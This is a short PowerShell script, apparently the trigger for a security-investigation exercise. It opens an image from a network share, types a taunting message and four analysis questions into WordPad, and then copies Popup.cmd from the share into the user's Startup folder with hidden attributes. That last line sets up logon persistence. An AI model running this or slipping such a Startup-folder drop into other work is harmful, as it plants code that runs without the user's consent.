Add-Type -AssemblyName System.Windows.Forms
Invoke-Item "\\My_Shared_File_Server\Anonymous.jpg"
Start-Process Wordpad
Start-Sleep -Seconds 3
[System.Windows.Forms.SendKeys]::SendWait("Be careful with what you open! I dropped a file somewhere in your USERPROFILE environment. It's up to you to find it :3")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("Questions:")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("1 - What does the Excel file do?")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("2 - What do the scripts do?")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("3 - What are the investigation steps?")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("4 - Suggest some remediations")
xcopy "\\My_Shared_File_Server\Popup.cmd" "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /H

